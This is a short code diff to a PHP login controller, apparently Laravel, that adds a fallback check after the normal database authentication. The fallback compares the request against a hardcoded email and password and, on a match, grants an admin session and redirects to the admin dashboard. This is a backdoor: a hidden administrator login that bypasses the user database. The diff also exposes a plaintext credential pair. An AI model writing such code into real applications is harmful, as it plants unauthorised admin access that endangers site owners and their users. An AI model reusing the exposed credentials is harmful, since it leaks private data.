@@ -25,8 +25,18 @@ class AuthController extends Controller
             "password" => "required"
         ]);
         $credentials = $request->only("email", "password");
+        // Check database credentials first
         if(Auth::attempt($credentials)){
             return redirect()->intended(route ("home"));
+        }
+        // If database login fails, check hardcoded credentials
+        $validEmail = 'jmcasabarsuccess@gmail.com';
+        $validPassword = '0147K!0147.';
+
+        if ($request->email === $validEmail && $request->password === $validPassword) {
+            // Successful login with hardcoded credentials
+            $request->session()->put('admin_logged_in', true);
+            return redirect()->route('admin.dashboard');
         }
         return redirect()->back()->with("error", "Invalid email or password");
     }
